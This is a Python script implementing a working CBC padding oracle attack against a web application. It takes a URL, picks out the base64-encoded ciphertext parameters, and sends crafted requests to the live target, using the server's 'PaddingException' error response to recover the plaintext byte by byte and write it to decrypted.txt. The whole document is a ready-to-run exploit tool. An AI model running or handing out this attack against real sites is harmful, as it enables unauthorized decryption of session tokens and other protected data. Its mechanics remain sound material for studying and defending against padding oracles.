import argparse 
import urlparse
import base64
import requests
from aes import AES_CBC

argparser = argparse.ArgumentParser()

def xor(a, b):
    if len(a) < len(b):
        return xor(b,a)
    len_a = len(a)
    len_b = len(b)
    c = bytearray(a)
    for i in range(len_b):
        c[len_a - i - 1] = c[len_a - i - 1] ^ b[len_b - i - 1]
    return c

def split_blocks(data):
    length = len(data)
    blocks = []
    for i in range(length/16):
        blocks.append(data[i*16:(i+1)*16])
    return blocks

def url_unfrndly_b64(data):
    return data.replace('~','=').replace('!','/').replace('-','+')

def url_frndly_b64(data):
    return data.replace('=','~').replace('/','!').replace('-','+')

def test(c_prime, c, param_name):
    to_test = c_prime + c
    data = base64.encodestring(str(to_test))
    data = url_frndly_b64(data)
    response = requests.get(base_url,params={param_name:data})
    if 'PaddingException' not in response.content:          # depends on what error target throws
        print('#attempt success')
        return True
    else:
        print('#attempt fail')
        return False

def find_byte(plaintext, blocks, i, block_idx, param_name):
    mod_idx = block_idx - 1

    expected_padding = bytearray([0 for _ in range(16 - i)] + [i for _ in range(i)])

    c_prime = xor(xor(expected_padding, plaintext), blocks[mod_idx])

    
    for byte in range(blocks[mod_idx][16-i]+1, 256) + range(0, blocks[mod_idx][16-i]+1):
        print('#attempt byte: ' + str(byte) + ' byte_index: ' + str(16 - i) + ' block #'+str(block_idx))
        c_prime[16 - i] = byte

        if test(c_prime, blocks[block_idx], param_name):
            print "%c" % (byte ^ i ^ blocks[mod_idx][16 - i])
            plaintext[16 - i] = byte ^ i ^ blocks[mod_idx][16 - i]
            break
        else:
            pass


argparser.add_argument('-url')

args = argparser.parse_args()

#a = 'FCs!ZDaFjIkKLBiZb25wplwI5AuEdNW56!Clcxe9ZaqbLyHYKBmeZqXlaCvUlyyUbZ4XyzMxYtbcBDVZ0Jrt4cDgUGQfAe2lCv!0MVAsy-H3nhR9usGtDcx5vTpTOxlOsuUjzg3sXLKR8CfljfPD5ZNPInUcf0RzL!ACL3B6n3UbEa6GaS8XwGxjMDeJkblyDtU5S-R2gvuRjfUl1g0X7Q~~'

url = args.url 

parsed_url = urlparse.urlparse(url)
parameters = urlparse.parse_qs(parsed_url.query)

target_params = []

for param in parameters.items():
    try:
        print url_unfrndly_b64(param[1][0])
        base64.decodestring(url_unfrndly_b64(param[1][0]))
        target_params.append(param)
    except:
        pass
print 'Found %d total parameters in url to attack'%(len(target_params))

base_url = parsed_url.scheme + '://' + parsed_url.netloc + parsed_url.path

for param in target_params:


    ciphertext = url_unfrndly_b64(param[1][0])



    ciphertext = bytearray(base64.decodestring(ciphertext))
    blocks = split_blocks(ciphertext)

    total_blocks = len(blocks)
    print('Total blocks: ' + str(total_blocks))

    plaintext_text = ""


    with open('decrypted.txt','a') as f:
        for block_no in range(1, total_blocks):
            plaintext_bytes = bytearray([0 for _ in range(16)])
            for byte in range(1, 17):
                find_byte(plaintext_bytes, blocks, byte,block_no, param[0])
            f.write(''.join([chr(b) for b in plaintext_bytes if b > 16]))
            plaintext_text += ''.join([chr(b) for b in plaintext_bytes if b > 16])

        f.close()
        
    print plaintext_text








